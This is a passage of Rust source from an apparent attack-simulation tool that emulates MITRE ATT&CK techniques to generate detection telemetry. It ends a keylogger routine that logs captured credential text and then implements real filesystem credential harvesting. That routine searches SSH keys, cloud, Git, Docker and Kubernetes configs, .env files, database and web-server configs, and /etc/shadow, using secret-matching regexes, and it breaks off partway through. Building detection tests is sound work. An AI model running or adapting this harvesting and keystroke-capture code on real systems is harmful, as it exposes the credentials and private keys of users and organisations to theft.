            //   let mut inotify = Inotify::init()?;
            //   for device in &accessible_devices {
            //       inotify.watches().add(device, WatchMask::ACCESS)?;
            //   }
            //   // Read events for 5-10 seconds
            //   // Log any IN_ACCESS events as keyboard activity
            
            // Write summary
            writeln!(file).unwrap();
            writeln!(file, "=== Keystroke Capture Summary (v1.5.13) ===").unwrap();
            writeln!(file,"Capture method: {capture_method}").unwrap();
            writeln!(file,"Events/lines captured: {events_captured}").unwrap();
            writeln!(file, "Potential credentials found: {}", potential_credentials.len()).unwrap();
            writeln!(file).unwrap();
            
            if !potential_credentials.is_empty() {
                writeln!(file, "=== Potential Credentials Extracted ===").unwrap();
                for (idx, cred) in potential_credentials.iter().take(20).enumerate() {
                    writeln!(file, "{}. {}", idx + 1, cred.chars().take(200).collect::<String>()).unwrap();
                }
            }
            
            writeln!(file).unwrap();
            writeln!(file, "=== WARNING ===").unwrap();
            writeln!(file, "This analysis may have captured sensitive authentication data.").unwrap();
            writeln!(file, "Ensure proper cleanup and secure handling of all artefacts.").unwrap();
            
            // Log summary
            info!("Keylogger capture complete:");
            info!("  - Method: {capture_method}");
            info!("  - Events/lines captured: {events_captured}");
            info!("  - Potential credentials found: {}", potential_credentials.len());
            info!("  - Log saved to: {log_file}");
            
            let success_message = format!(
                "Keystroke capture complete via {} - {} events/lines captured, {} potential credentials found",
                capture_method, events_captured, potential_credentials.len()
            );
            
            Ok(SimulationResult {
                technique_id: self.info().id,
                success: true,
                message: success_message,
                artifacts,
                cleanup_required: true,
            })
        })
    }

    fn cleanup<'a>(&'a self, artifacts: &'a [String]) -> CleanupFuture<'a> {
        Box::pin(async move {
            for artifact in artifacts {
                if Path::new(artifact).exists() {
                    match fs::remove_file(artifact) {
                        Ok(_) => info!("Removed artefact: {artifact}"),
                        Err(e) => warn!("Failed to remove artefact {artifact}: {e}"),
                    }
                }
            }
            Ok(())
        })
    }
}

pub struct CredentialsInFiles {}

#[async_trait]
impl AttackTechnique for CredentialsInFiles {
    fn info(&self) -> Technique {
        Technique {
            id: "T1552.001".to_string(),
            name: "Credentials in Files".to_string(),
            description: "Performs exhaustive REAL filesystem credential harvesting across extensive locations including user homes (.ssh/, .aws/, .env, .netrc, .git-credentials, .docker/, .kube/, .pgpass, .my.cnf, .s3cfg), web servers (/var/www for .htpasswd, wp-config.php), application directories (/opt, /srv for application.properties, appsettings.json, database.yml), system data (/var/lib for Docker, databases), local configs (/usr/local/etc), system files (/etc/shadow when root, /root/.ssh when root), and database dump files (*.sql, *.dump, *.backup containing credentials). Extracts passwords, API keys, tokens, private keys, connection strings (jdbc:, mongodb+srv:), and email credentials. Designed to generate maximum EDR/XDR detection telemetry through comprehensive filesystem access.".to_string(),
            category: "credential_access".to_string(),
            parameters: vec![
                TechniqueParameter {
                    name: "output_file".to_string(),
                    description: "File to save detailed credential discovery log".to_string(),
                    required: false,
                    default: Some("/tmp/signalbench_discovered_credentials.log".to_string()),
                },
            ],
            detection: "Monitor for enumeration patterns including excessive file access across /var/www, /opt, /srv, /var/lib, /usr/local/etc, /root/.ssh (when root), sequential reading of .pgpass, .my.cnf, .s3cfg, wp-config.php, application.properties, appsettings.json, database.yml, SSH keys, AWS credentials, .env files, .netrc, git credentials, Docker/Kubernetes configs, /etc/shadow access, database dump file enumeration (*.sql, *.dump, *.backup), connection string extraction (jdbc:, mongodb+srv:), email credential parsing, and .htpasswd file access. This technique generates HIGH-VOLUME filesystem access telemetry across critical system and application directories.".to_string(),
            cleanup_support: true,
            platforms: vec!["Linux".to_string()],
            permissions: vec!["user (partial) or root (full with /etc/shadow, /root/.ssh, /var/lib access)".to_string()],
            voltron_only: false,
        }
    }

    fn execute<'a>(&'a self, config: &'a TechniqueConfig, dry_run: bool) -> ExecuteFuture<'a> {
        Box::pin(async move {
            let output_file = config.parameters.get("output_file").unwrap_or(&"/tmp/signalbench_discovered_credentials.log".to_string()).clone();
            
            // Check if running as root
            let is_root = unsafe { libc::geteuid() } == 0;
            
            if dry_run {
                info!("[DRY RUN] Would perform REAL filesystem credential harvesting");
                info!("[DRY RUN] Running as root: {is_root}");
                info!("[DRY RUN] Would search: SSH keys, AWS creds, .env, .netrc, git creds, Docker/K8s configs{}", 
                    if is_root { ", /etc/shadow" } else { "" });
                return Ok(SimulationResult {
                    technique_id: self.info().id,
                    success: true,
                    message: format!("DRY RUN: Would harvest REAL credentials from filesystem (root: {is_root})"),
                    artifacts: vec![output_file],
                    cleanup_required: false,
                });
            }

            info!("Starting REAL filesystem credential harvesting...");
            info!("Running as root: {is_root}");
            
            // Create output file
            let mut log = File::create(&output_file).map_err(|e| format!("Failed to create output file: {e}"))?;
            
            writeln!(log, "=== SignalBench REAL Credential Harvesting ===").unwrap();
            writeln!(log, "Timestamp: {}", chrono::Local::now()).unwrap();
            writeln!(log,"Running as root: {is_root}").unwrap();
            writeln!(log, "MITRE ATT&CK: T1552.001 - Credentials in Files").unwrap();
            writeln!(log).unwrap();
            
            // Credential patterns to search for - ENHANCED v1.5.13
            let password_patterns = vec![
                Regex::new(r"(?i)(password|passwd|pwd)\s*[:=]\s*[^\s]{3,}").unwrap(),
                Regex::new(r"(?i)(auth|authentication)\s*[:=]\s*[^\s]{3,}").unwrap(),
                Regex::new(r"(?i)DB_PASSWORD\s*[:=]\s*[^\s]{3,}").unwrap(),
            ];
            let api_key_patterns = vec![
                Regex::new(r"sk_[a-zA-Z0-9]{20,}").unwrap(),
                Regex::new(r"(?i)(api_?key|apikey)\s*[:=]\s*[^\s]{3,}").unwrap(),
                Regex::new(r"AKIA[0-9A-Z]{16}").unwrap(), // AWS access key
                Regex::new(r"ghp_[a-zA-Z0-9]{36}").unwrap(), // GitHub token
            ];
            let token_patterns = vec![
                Regex::new(r"(?i)token\s*[:=]\s*[^\s]{3,}").unwrap(),
                Regex::new(r"(?i)bearer\s+[a-zA-Z0-9\-._~+/]+=*").unwrap(),
            ];
            let secret_patterns = vec![
                Regex::new(r"(?i)secret\s*[:=]\s*[^\s]{3,}").unwrap(),
                Regex::new(r"(?i)(private_?key|privatekey)\s*[:=]").unwrap(),
            ];
            // NEW v1.5.13: Connection string patterns
            let connection_string_patterns = vec![
                Regex::new(r"jdbc:[a-zA-Z0-9:/@.-]+").unwrap(), // JDBC connection strings
                Regex::new(r"mongodb(\+srv)?://[a-zA-Z0-9:/@.-]+").unwrap(), // MongoDB connection strings
                Regex::new(r"(?i)(mysql|postgresql|postgres)://[a-zA-Z0-9:/@.-]+").unwrap(), // SQL connection strings
            ];
            // NEW v1.5.13: Email credential patterns
            let email_patterns = vec![
                Regex::new(r"(?i)smtp_?password\s*[:=]\s*[^\s]{3,}").unwrap(),
                Regex::new(r"(?i)mail_?password\s*[:=]\s*[^\s]{3,}").unwrap(),
                Regex::new(r"(?i)email_?password\s*[:=]\s*[^\s]{3,}").unwrap(),
            ];
            
            let mut files_searched = 0;
            let mut credential_files_found = 0;
            let mut total_patterns_found = 0;
            let mut search_locations = Vec::new();
            
            // Structure to hold findings
            #[derive(Debug)]
            struct CredentialFinding {
                file_path: String,
                credential_type: String,
                pattern_matches: usize,
            }
            
            let mut findings = Vec::new();
            
            writeln!(log, "## Filesystem Credential Search Locations").unwrap();
            writeln!(log).unwrap();
            
            // Get home directories to search
            let mut home_dirs = Vec::new();
            
            // Search /home/* directories
            if let Ok(entries) = fs::read_dir("/home") {
                for entry in entries.flatten() {
                    if entry.path().is_dir() {
                        home_dirs.push(entry.path());
                    }
                }
            }
            
            // Add root home if running as root
            if is_root {
                home_dirs.push(std::path::PathBuf::from("/root"));
            }
            
            // Add current user's home
            if let Ok(home) = std::env::var("HOME") {
                let home_path = std::path::PathBuf::from(home);
                if !home_dirs.contains(&home_path) {
                    home_dirs.push(home_path);
                }
            }
            
            writeln!(log, "Home directories to search: {}", home_dirs.len()).unwrap();
            for dir in &home_dirs {
                writeln!(log, "  - {}", dir.display()).unwrap();
            }
            writeln!(log).unwrap();
            
            // Helper function to search file for patterns - ENHANCED v1.5.13
            let search_file_for_credentials = |_file_path: &Path, content: &str, log: &mut File| -> (bool, usize, Vec<String>) {
                let mut found = false;
                let mut pattern_count = 0;
                let mut cred_types = Vec::new();
                
                // Check for SSH private key headers
                if content.contains("BEGIN") && content.contains("PRIVATE KEY") {
                    found = true;
                    pattern_count += 1;
                    cred_types.push("SSH Private Key".to_string());
                    writeln!(log, "  [SSH PRIVATE KEY] Found private key header").unwrap();
                }
                
                // Check for password patterns
                for pattern in &password_patterns {
                    for capture in pattern.find_iter(content) {
                        found = true;
                        pattern_count += 1;
                        if !cred_types.contains(&"Password".to_string()) {
                            cred_types.push("Password".to_string());
                        }
                        writeln!(log, "  [PASSWORD] Pattern match (length: {})", capture.as_str().len()).unwrap();
                    }
                }
                
                // Check for API key patterns
                for pattern in &api_key_patterns {
                    for capture in pattern.find_iter(content) {
                        found = true;
                        pattern_count += 1;
                        if !cred_types.contains(&"API Key".to_string()) {
                            cred_types.push("API Key".to_string());
                        }
                        writeln!(log, "  [API KEY] Pattern match (length: {})", capture.as_str().len()).unwrap();
                    }
                }
                
                // Check for token patterns
                for pattern in &token_patterns {
                    for capture in pattern.find_iter(content) {
                        found = true;
                        pattern_count += 1;
                        if !cred_types.contains(&"Token".to_string()) {
                            cred_types.push("Token".to_string());
                        }
                        writeln!(log, "  [TOKEN] Pattern match (length: {})", capture.as_str().len()).unwrap();
                    }
                }
                
                // Check for secret patterns
                for pattern in &secret_patterns {
                    for capture in pattern.find_iter(content) {
                        found = true;
                        pattern_count += 1;
                        if !cred_types.contains(&"Secret".to_string()) {
                            cred_types.push("Secret".to_string());
                        }
                        writeln!(log, "  [SECRET] Pattern match (length: {})", capture.as_str().len()).unwrap();
                    }
                }
                
                // NEW v1.5.13: Check for connection string patterns
                for pattern in &connection_string_patterns {
                    for capture in pattern.find_iter(content) {
                        found = true;
                        pattern_count += 1;
                        if !cred_types.contains(&"Connection String".to_string()) {
                            cred_types.push("Connection String".to_string());
                        }
                        writeln!(log, "  [CONNECTION STRING] Pattern match (length: {})", capture.as_str().len()).unwrap();
                    }
                }
                
                // NEW v1.5.13: Check for email credential patterns
                for pattern in &email_patterns {
                    for capture in pattern.find_iter(content) {
                        found = true;
                        pattern_count += 1;
                        if !cred_types.contains(&"Email Credentials".to_string()) {
                            cred_types.push("Email Credentials".to_string());
                        }
                        writeln!(log, "  [EMAIL CREDENTIALS] Pattern match (length: {})", capture.as_str().len()).unwrap();
                    }
                }
                
                (found, pattern_count, cred_types)
            };
            
            // 1. Search for SSH keys and configs
            writeln!(log, "### 1. SSH Keys and Configurations").unwrap();
            search_locations.push("SSH keys (.ssh/)".to_string());
            
            for home_dir in &home_dirs {
                let ssh_dir = home_dir.join(".ssh");
                if ssh_dir.exists() {
                    writeln!(log, "Searching: {}", ssh_dir.display()).unwrap();
                    
                    if let Ok(entries) = fs::read_dir(&ssh_dir) {
                        for entry in entries.flatten() {
                            let path = entry.path();
                            files_searched += 1;
                            
                            if let Ok(content) = fs::read_to_string(&path) {
                                let (found, count, types) = search_file_for_credentials(&path, &content, &mut log);
                                
                                if found {
                                    credential_files_found += 1;
                                    total_patterns_found += count;
                                    writeln!(log, "[OK] Credential file: {} ({} patterns)", path.display(), count).unwrap();
                                    
                                    findings.push(CredentialFinding {
                                        file_path: path.display().to_string(),
                                        credential_type: types.join(", "),
                                        pattern_matches: count,
                                    });
                                }
                            }
                        }
                    }
                }
            }
            writeln!(log).unwrap();
            
            // 2. Search for AWS credentials
            writeln!(log, "### 2. AWS Credentials").unwrap();
            search_locations.push("AWS credentials (.aws/)".to_string());
            
            for home_dir in &home_dirs {
                let aws_creds = home_dir.join(".aws/credentials");
                if aws_creds.exists() {
                    files_searched += 1;
                    writeln!(log, "Searching: {}", aws_creds.display()).unwrap();
                    
                    if let Ok(content) = fs::read_to_string(&aws_creds) {
                        let (found, count, types) = search_file_for_credentials(&aws_creds, &content, &mut log);
                        
                        if found {
                            credential_files_found += 1;
                            total_patterns_found += count;
                            writeln!(log, "[OK] Credential file: {} ({} patterns)", aws_creds.display(), count).unwrap();
                            
                            findings.push(CredentialFinding {
                                file_path: aws_creds.display().to_string(),
                                credential_type: types.join(", "),
                                pattern_matches: count,
                            });
                        }
                    }
                }
            }
            writeln!(log).unwrap();
            
            // 3. Search for .netrc
            writeln!(log, "### 3. Network Credentials (.netrc)").unwrap();
            search_locations.push("Network credentials (.netrc)".to_string());
            
            for home_dir in &home_dirs {
                let netrc = home_dir.join(".netrc");
                if netrc.exists() {
                    files_searched += 1;
                    writeln!(log, "Searching: {}", netrc.display()).unwrap();
                    
                    if let Ok(content) = fs::read_to_string(&netrc) {
                        let (found, count, types) = search_file_for_credentials(&netrc, &content, &mut log);
                        
                        if found || content.contains("password") || content.contains("login") {
                            credential_files_found += 1;
                            total_patterns_found += count;
                            writeln!(log, "[OK] Credential file: {} ({} patterns)", netrc.display(), count).unwrap();
                            
                            findings.push(CredentialFinding {
                                file_path: netrc.display().to_string(),
                                credential_type: if types.is_empty() { "Network Auth".to_string() } else { types.join(", ") },
                                pattern_matches: count,
                            });
                        }
                    }
                }
            }
            writeln!(log).unwrap();
            
            // 4. Search for git credentials
            writeln!(log, "### 4. Git Credentials").unwrap();
            search_locations.push("Git credentials (.git-credentials)".to_string());
            
            for home_dir in &home_dirs {
                let git_creds = home_dir.join(".git-credentials");
                if git_creds.exists() {
                    files_searched += 1;
                    writeln!(log, "Searching: {}", git_creds.display()).unwrap();
                    
                    if let Ok(content) = fs::read_to_string(&git_creds) {
                        let (found, count, types) = search_file_for_credentials(&git_creds, &content, &mut log);
                        
                        if found || content.contains("://") {
                            credential_files_found += 1;
                            total_patterns_found += count;
                            writeln!(log, "[OK] Credential file: {} ({} patterns)", git_creds.display(), count).unwrap();
                            
                            findings.push(CredentialFinding {
                                file_path: git_creds.display().to_string(),
                                credential_type: if types.is_empty() { "Git Auth".to_string() } else { types.join(", ") },
                                pattern_matches: count,
                            });
                        }
                    }
                }
            }
            writeln!(log).unwrap();
            
            // 5. Search for .env files recursively
            writeln!(log, "### 5. Environment Files (.env) - Recursive Search").unwrap();
            search_locations.push("Environment files (.env)".to_string());
            
            for home_dir in &home_dirs {
                // Use find command for recursive .env search
                let find_output = Command::new("find")
                    .arg(home_dir.to_str().unwrap())
                    .arg("-name")
                    .arg(".env")
                    .arg("-type")
                    .arg("f")
                    .arg("-readable")
                    .output()
                    .await;
                
                if let Ok(output) = find_output {
                    let env_files = String::from_utf8_lossy(&output.stdout);
                    for env_file_path in env_files.lines() {
                        if env_file_path.is_empty() {
                            continue;
                        }
                        
                        files_searched += 1;
                        writeln!(log,"Searching: {env_file_path}").unwrap();
                        
                        if let Ok(content) = fs::read_to_string(env_file_path) {
                            let (found, count, types) = search_file_for_credentials(Path::new(env_file_path), &content, &mut log);
                            
                            if found {
                                credential_files_found += 1;
                                total_patterns_found += count;
                                writeln!(log,"[OK] Credential file: {env_file_path} ({count} patterns)").unwrap();
                                
                                findings.push(CredentialFinding {
                                    file_path: env_file_path.to_string(),
                                    credential_type: types.join(", "),
                                    pattern_matches: count,
                                });
                            }
                        }
                    }
                }
            }
            writeln!(log).unwrap();
            
            // 6. Search for Docker config
            writeln!(log, "### 6. Docker Registry Credentials").unwrap();
            search_locations.push("Docker config (.docker/config.json)".to_string());
            
            for home_dir in &home_dirs {
                let docker_config = home_dir.join(".docker/config.json");
                if docker_config.exists() {
                    files_searched += 1;
                    writeln!(log, "Searching: {}", docker_config.display()).unwrap();
                    
                    if let Ok(content) = fs::read_to_string(&docker_config) {
                        let (found, count, types) = search_file_for_credentials(&docker_config, &content, &mut log);
                        
                        if found || content.contains("auth") || content.contains("auths") {
                            credential_files_found += 1;
                            total_patterns_found += count;
                            writeln!(log, "[OK] Credential file: {} ({} patterns)", docker_config.display(), count).unwrap();
                            
                            findings.push(CredentialFinding {
                                file_path: docker_config.display().to_string(),
                                credential_type: if types.is_empty() { "Docker Auth".to_string() } else { types.join(", ") },
                                pattern_matches: count,
                            });
                        }
                    }
                }
            }
            writeln!(log).unwrap();
            
            // 7. Search for Kubernetes config
            writeln!(log, "### 7. Kubernetes Credentials").unwrap();
            search_locations.push("Kubernetes config (.kube/config)".to_string());
            
            for home_dir in &home_dirs {
                let kube_config = home_dir.join(".kube/config");
                if kube_config.exists() {
                    files_searched += 1;
                    writeln!(log, "Searching: {}", kube_config.display()).unwrap();
                    
                    if let Ok(content) = fs::read_to_string(&kube_config) {
                        let (found, count, types) = search_file_for_credentials(&kube_config, &content, &mut log);
                        
                        if found || content.contains("token") || content.contains("certificate-authority-data") {
                            credential_files_found += 1;
                            total_patterns_found += count;
                            writeln!(log, "[OK] Credential file: {} ({} patterns)", kube_config.display(), count).unwrap();
                            
                            findings.push(CredentialFinding {
                                file_path: kube_config.display().to_string(),
                                credential_type: if types.is_empty() { "Kubernetes Auth".to_string() } else { types.join(", ") },
                                pattern_matches: count,
                            });
                        }
                    }
                }
            }
            writeln!(log).unwrap();
            
            // 8. Search /etc/shadow if running as root
            if is_root {
                writeln!(log, "### 8. System Password Hashes (/etc/shadow)").unwrap();
                search_locations.push("/etc/shadow (password hashes)".to_string());
                
                let shadow_path = Path::new("/etc/shadow");
                if shadow_path.exists() {
                    files_searched += 1;
                    writeln!(log, "Searching: {}", shadow_path.display()).unwrap();
                    
                    if let Ok(content) = fs::read_to_string(shadow_path) {
                        let hash_count = content.lines()
                            .filter(|line| line.contains("$") && line.contains(":"))
                            .count();
                        
                        if hash_count > 0 {
                            credential_files_found += 1;
                            total_patterns_found += hash_count;
                            writeln!(log, "[OK] Credential file: {} ({} password hashes)", shadow_path.display(), hash_count).unwrap();
                            writeln!(log,"  [PASSWORD HASH] Found {hash_count} user password hashes").unwrap();
                            
                            findings.push(CredentialFinding {
                                file_path: shadow_path.display().to_string(),
                                credential_type: "Password Hashes".to_string(),
                                pattern_matches: hash_count,
                            });
                        }
                    }
                }
                writeln!(log).unwrap();
            }
            
            // NEW v1.5.13: Section 9 - User-specific database credential files
            writeln!(log, "### 9. User Database Credential Files (.pgpass, .my.cnf, .s3cfg)").unwrap();
            search_locations.push("Database credentials (.pgpass, .my.cnf, .s3cfg)".to_string());
            
            for home_dir in &home_dirs {
                // PostgreSQL password file
                let pgpass = home_dir.join(".pgpass");
                if pgpass.exists() {
                    files_searched += 1;
                    writeln!(log, "Searching: {}", pgpass.display()).unwrap();
                    
                    if let Ok(content) = fs::read_to_string(&pgpass) {
                        let (found, count, types) = search_file_for_credentials(&pgpass, &content, &mut log);
                        
                        if found || content.contains(":") {
                            credential_files_found += 1;
                            total_patterns_found += count.max(content.lines().filter(|l| l.contains(":")).count());
                            writeln!(log, "[OK] Credential file: {} ({} patterns)", pgpass.display(), count).unwrap();
                            
                            findings.push(CredentialFinding {
                                file_path: pgpass.display().to_string(),
                                credential_type: if types.is_empty() { "PostgreSQL Credentials".to_string() } else { types.join(", ") },
                                pattern_matches: count,
                            });
                        }
                    }
                }
                
                // MySQL credentials file
                let my_cnf = home_dir.join(".my.cnf");
                if my_cnf.exists() {
                    files_searched += 1;
                    writeln!(log, "Searching: {}", my_cnf.display()).unwrap();
                    
                    if let Ok(content) = fs::read_to_string(&my_cnf) {
                        let (found, count, types) = search_file_for_credentials(&my_cnf, &content, &mut log);
                        
                        if found || content.contains("password") {
                            credential_files_found += 1;
                            total_patterns_found += count;
                            writeln!(log, "[OK] Credential file: {} ({} patterns)", my_cnf.display(), count).unwrap();
                            
                            findings.push(CredentialFinding {
                                file_path: my_cnf.display().to_string(),
                                credential_type: if types.is_empty() { "MySQL Credentials".to_string() } else { types.join(", ") },
                                pattern_matches: count,
                            });
                        }
                    }
                }
                
                // AWS S3 configuration file
                let s3cfg = home_dir.join(".s3cfg");
                if s3cfg.exists() {
                    files_searched += 1;
                    writeln!(log, "Searching: {}", s3cfg.display()).unwrap();
                    
                    if let Ok(content) = fs::read_to_string(&s3cfg) {
                        let (found, count, types) = search_file_for_credentials(&s3cfg, &content, &mut log);
                        
                        if found || content.contains("access_key") || content.contains("secret_key") {
                            credential_files_found += 1;
                            total_patterns_found += count;
                            writeln!(log, "[OK] Credential file: {} ({} patterns)", s3cfg.display(), count).unwrap();
                            
                            findings.push(CredentialFinding {
                                file_path: s3cfg.display().to_string(),
                                credential_type: if types.is_empty() { "AWS S3 Credentials".to_string() } else { types.join(", ") },
                                pattern_matches: count,
                            });
                        }
                    }
                }
            }
            writeln!(log).unwrap();
            
            // NEW v1.5.13: Section 10 - /var/www web server configurations
            writeln!(log, "### 10. Web Server Configurations (/var/www)").unwrap();
            search_locations.push("/var/www (web configs, .htpasswd, wp-config.php)".to_string());
            
            if Path::new("/var/www").exists() {
                // Search for wp-config.php files
                let find_output = Command::new("find")
                    .arg("/var/www")
                    .arg("-name")
                    .arg("wp-config.php")
                    .arg("-type")
                    .arg("f")
                    .arg("-readable")
                    .arg("2>/dev/null")
                    .output()
                    .await;
                
                if let Ok(output) = find_output {
                    let wp_configs = String::from_utf8_lossy(&output.stdout);
                    for wp_config_path in wp_configs.lines().take(20) {
                        if wp_config_path.is_empty() {
                            continue;
                        }
                        
                        files_searched += 1;
                        writeln!(log, "Searching: {wp_config_path}").unwrap();
                        
                        if let Ok(content) = fs::read_to_string(wp_config_path) {
                            let (found, count, types) = search_file_for_credentials(Path::new(wp_config_path), &content, &mut log);
                            
                            if found || content.contains("DB_PASSWORD") || content.contains("DB_USER") {
                                credential_files_found += 1;
                                total_patterns_found += count;
                                writeln!(log, "[OK] Credential file: {wp_config_path} ({count} patterns)").unwrap();
                                
                                findings.push(CredentialFinding {
                                    file_path: wp_config_path.to_string(),
                                    credential_type: if types.is_empty() { "WordPress Database Credentials".to_string() } else { types.join(", ") },
                                    pattern_matches: count,
                                });
                            }
                        }
                    }
                }
                
                // Search for .htpasswd files
                let find_output = Command::new("find")
                    .arg("/var/www")
                    .arg("-name")
                    .arg(".htpasswd")
                    .arg("-type")
                    .arg("f")
                    .arg("-readable")
                    .arg("2>/dev/null")
                    .output()
                    .await;
                
                if let Ok(output) = find_output {
                    let htpasswd_files = String::from_utf8_lossy(&output.stdout);
                    for htpasswd_path in htpasswd_files.lines().take(20) {
                        if htpasswd_path.is_empty() {
                            continue;
                        }
                        
                        files_searched += 1;
                        writeln!(log, "Searching: {htpasswd_path}").unwrap();
                        
                        if let Ok(content) = fs::read_to_string(htpasswd_path) {
                            let hash_count = content.lines().filter(|l| l.contains(":")).count();
                            if hash_count > 0 {
                                credential_files_found += 1;
                                total_patterns_found += hash_count;
                                writeln!(log, "[OK] Credential file: {htpasswd_path} ({hash_count} password hashes)").unwrap();
                                writeln!(log, "  [HTPASSWD] Found {hash_count} HTTP auth hashes").unwrap();
                                
                                findings.push(CredentialFinding {
                                    file_path: htpasswd_path.to_string(),
                                    credential_type: "HTTP Auth Hashes".to_string(),
                                    pattern_matches: hash_count,
                                });
                            }
                        }
                    }
                }
            } else {
                writeln!(log, "/var/www does not exist or is not accessible").unwrap();
            }
            writeln!(log).unwrap();
            
            // NEW v1.5.13: Section 11 - /opt third-party applications
            writeln!(log, "### 11. Third-Party Application Configs (/opt)").unwrap();
            search_locations.push("/opt (application.properties, appsettings.json, database.yml)".to_string());
            
            if Path::new("/opt").exists() {
                // Search for Java application.properties
                let find_output = Command::new("find")
                    .arg("/opt")
                    .arg("-name")
                    .arg("application.properties")
                    .arg("-type")
                    .arg("f")
                    .arg("-readable")
                    .arg("2>/dev/null")
                    .output()
                    .await;
                
                if let Ok(output) = find_output {
                    let app_props = String::from_utf8_lossy(&output.stdout);
                    for props_path in app_props.lines().take(20) {
                        if props_path.is_empty() {
                            continue;
                        }
                        
                        files_searched += 1;
                        writeln!(log, "Searching: {props_path}").unwrap();
                        
                        if let Ok(content) = fs::read_to_string(props_path) {
                            let (found, count, types) = search_file_for_credentials(Path::new(props_path), &content, &mut log);
                            
                            if found {
                                credential_files_found += 1;
                                total_patterns_found += count;
                                writeln!(log, "[OK] Credential file: {props_path} ({count} patterns)").unwrap();
                                
                                findings.push(CredentialFinding {
                                    file_path: props_path.to_string(),
                                    credential_type: if types.is_empty() { "Java Application Credentials".to_string() } else { types.join(", ") },
                                    pattern_matches: count,
                                });
                            }
                        }
                    }
                }
                
                // Search for .NET appsettings.json
                let find_output = Command::new("find")
                    .arg("/opt")
                    .arg("-name")
                    .arg("appsettings.json")
                    .arg("-type")
                    .arg("f")
                    .arg("-readable")
                    .arg("2>/dev/null")
                    .output()
                    .await;
                
                if let Ok(output) = find_output {
                    let app_settings = String::from_utf8_lossy(&output.stdout);
                    for settings_path in app_settings.lines().take(20) {
                        if settings_path.is_empty() {
                            continue;
                        }
                        
                        files_searched += 1;
                        writeln!(log, "Searching: {settings_path}").unwrap();
                        
                        if let Ok(content) = fs::read_to_string(settings_path) {
                            let (found, count, types) = search_file_for_credentials(Path::new(settings_path), &content, &mut log);
                            
                            if found {
                                credential_files_found += 1;
                                total_patterns_found += count;
                                writeln!(log, "[OK] Credential file: {settings_path} ({count} patterns)").unwrap();
                                
                                findings.push(CredentialFinding {
                                    file_path: settings_path.to_string(),
                                    credential_type: if types.is_empty() { ".NET Application Credentials".to_string() } else { types.join(", ") },
                                    pattern_matches: count,
                                });
                            }
                        }
                    }
                }
                
                // Search for Rails database.yml
                let find_output = Command::new("find")
                    .arg("/opt")
                    .arg("-name")
                    .arg("database.yml")
                    .arg("-type")
                    .arg("f")
                    .arg("-readable")
                    .arg("2>/dev/null")
                    .output()
                    .await;
                
                if let Ok(output) = find_output {
                    let db_ymls = String::from_utf8_lossy(&output.stdout);
                    for yml_path in db_ymls.lines().take(20) {
                        if yml_path.is_empty() {
                            continue;
                        }
                        
                        files_searched += 1;
                        writeln!(log, "Searching: {yml_path}").unwrap();
                        
                        if let Ok(content) = fs::read_to_string(yml_path) {
                            let (found, count, types) = search_file_for_credentials(Path::new(yml_path), &content, &mut log);
                            
                            if found {
                                credential_files_found += 1;
                                total_patterns_found += count;
                                writeln!(log, "[OK] Credential file: {yml_path} ({count} patterns)").unwrap();
                                
                                findings.push(CredentialFinding {
                                    file_path: yml_path.to_string(),
                                    credential_type: if types.is_empty() { "Rails Database Credentials".to_string() } else { types.join(", ") },
                                    pattern_matches: count,
                                });
                            }
                        }
                    }
                }
            } else {
                writeln!(log, "/opt does not exist or is not accessible").unwrap();
            }
            writeln!(log).unwrap();
            
            // NEW v1.5.13: Section 12 - /srv service data
            writeln!(log, "### 12. Service Data Configurations (/srv)").unwrap();
            search_locations.push("/srv (service configs)".to_string());
            
            if Path::new("/srv").exists() {
                // Search for common config files in /srv
                for config_pattern in &["*.conf", "*.config", "*.yml", "*.yaml", ".env"] {
                    let find_output = Command::new("find")
                        .arg("/srv")
                        .arg("-name")
                        .arg(config_pattern)
                        .arg("-type")
                        .arg("f")
                        .arg("-readable")
                        .arg("2>/dev/null")
                        .output()
                        .await;
                    
                    if let Ok(output) = find_output {
                        let config_files = String::from_utf8_lossy(&output.stdout);
                        for config_path in config_files.lines().take(10) {
                            if config_path.is_empty() {
                                continue;
                            }
                            
                            files_searched += 1;
                            writeln!(log, "Searching: {config_path}").unwrap();
                            
                            if let Ok(content) = fs::read_to_string(config_path) {
                                let (found, count, types) = search_file_for_credentials(Path::new(config_path), &content, &mut log);
                                
                                if found {
                                    credential_files_found += 1;
                                    total_patterns_found += count;
                                    writeln!(log, "[OK] Credential file: {config_path} ({count} patterns)").unwrap();
                                    
                                    findings.push(CredentialFinding {
                                        file_path: config_path.to_string(),
                                        credential_type: if types.is_empty() { "Service Credentials".to_string() } else { types.join(", ") },
                                        pattern_matches: count,
                                    });
                                }
                            }
                        }
                    }
                }
            } else {
                writeln!(log, "/srv does not exist or is not accessible").unwrap();
            }
            writeln!(log).unwrap();
            
            // NEW v1.5.13: Section 13 - /var/lib application data
            if is_root {
                writeln!(log, "### 13. Application Data (/var/lib) - ROOT ONLY").unwrap();
                search_locations.push("/var/lib (Docker, database configs)".to_string());
                
                if Path::new("/var/lib").exists() {
                    // Search for Docker configs
                    if Path::new("/var/lib/docker").exists() {
                        writeln!(log, "Searching /var/lib/docker for config files...").unwrap();
                        let find_output = Command::new("find")
                            .arg("/var/lib/docker")
                            .arg("-name")
                            .arg("config.json")
                            .arg("-type")
                            .arg("f")
                            .arg("-readable")
                            .arg("2>/dev/null")
                            .output()
                            .await;
                        
                        if let Ok(output) = find_output {
                            let docker_configs = String::from_utf8_lossy(&output.stdout);
                            for docker_path in docker_configs.lines().take(10) {
                                if docker_path.is_empty() {
                                    continue;
                                }
                                
                                files_searched += 1;
                                writeln!(log, "Searching: {docker_path}").unwrap();
                                
                                if let Ok(content) = fs::read_to_string(docker_path) {
                                    let (found, count, types) = search_file_for_credentials(Path::new(docker_path), &content, &mut log);
                                    
                                    if found {
                                        credential_files_found += 1;
                                        total_patterns_found += count;
                                        writeln!(log, "[OK] Credential file: {docker_path} ({count} patterns)").unwrap();
                                        
                                        findings.push(CredentialFinding {
                                            file_path: docker_path.to_string(),
                                            credential_type: if types.is_empty() { "Docker Credentials".to_string() } else { types.join(", ") },
                                            pattern_matches: count,
                                        });
                                    }
                                }
                            }
                        }
                    }
                    
                    // Search for MySQL/PostgreSQL data directories
                    for db_dir in &["/var/lib/mysql", "/var/lib/postgresql"] {
                        if Path::new(db_dir).exists() {
                            writeln!(log, "Searching {db_dir} for credential files...").unwrap();
                            // Note: We're just enumerating, not extracting database data itself
                            files_searched += 1;
                        }
                    }
                } else {
                    writeln!(log, "/var/lib does not exist or is not accessible").unwrap();
                }
                writeln!(log).unwrap();
            }
            
            // NEW v1.5.13: Section 14 - /root/.ssh when running as root
            if is_root {
